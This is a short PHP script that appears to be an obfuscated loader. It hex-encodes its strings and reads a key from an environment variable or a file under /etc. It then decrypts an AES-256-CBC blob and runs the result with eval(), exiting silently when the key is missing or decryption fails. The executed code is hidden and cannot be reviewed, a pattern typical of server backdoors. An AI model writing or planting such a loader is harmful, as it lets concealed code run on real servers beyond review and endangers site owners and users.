<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('fWZN9m1F74lDZnkFzVlZAQ==');

$c=base64_decode(

'54N8rxVfVm1gMlDjhS42ab7Ht5qtz8MjXofarG6nte8+C5a/KZNVXeUkOkt7gK54mkATwqhXfGlf' .
'3oxh2hmHsD5XQSOvX2yL+OmKYEegmajqm9H2zRn5wQT9DqSCZD+4V7Y5q6IxyfVdfaQI1JxPiCFO' .
'zMmP3z5wjAfs87buPhXDPpdLpdZ85/a03OC/Ev/RUCdWCL+te5mdrjU1f9VXPS4YCmNf4PfNMudY' .
'ZUDswlNpJZAqZ3Lp1IodLr1UIx+P2x7vtv+/hA5Uv+rG4L/MhfGVI5R6/Md9Ba/Xpjaq3vGJBo8B' .
'fjwIOuCennNiNpVI0Okcl1ip7X/Iyc38hCmM30+wFzKwo4GzpKKMpRWXBTHGySmyMgdrF8EBB3+T' .
'GxhMRwEMxjokV4dX8muEguGEG939ae2jF3lA1i207EPj2japvB3qO7MYxOZ5nL42McoUezZvk9ly' .
'leTQY6gkF98b4EyN3DdwW6NDF4gJc96lAzg7N4XBoKkatiFHlQcu1CQ4u/8wDgCfib8KeabXXDlk' .
'bZKFkOmr7CSy97B6ymwts6ixY5JjUxQW2jSOqRbEkHbFf+hYCXZVgLzjk+af9RK4qUgZGFPF5xXQ' .
'E35cVscueEmqPEXESTVCWgoaOdNcRFj5l6MV2pgG/QeLPAsO6SD3duu3bo5WuYymyQrmugzNP3L0' .
'UpuRJLc8Kg8H1Rv53U9l1DBc+0dueJ4TixBkaPNTvg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

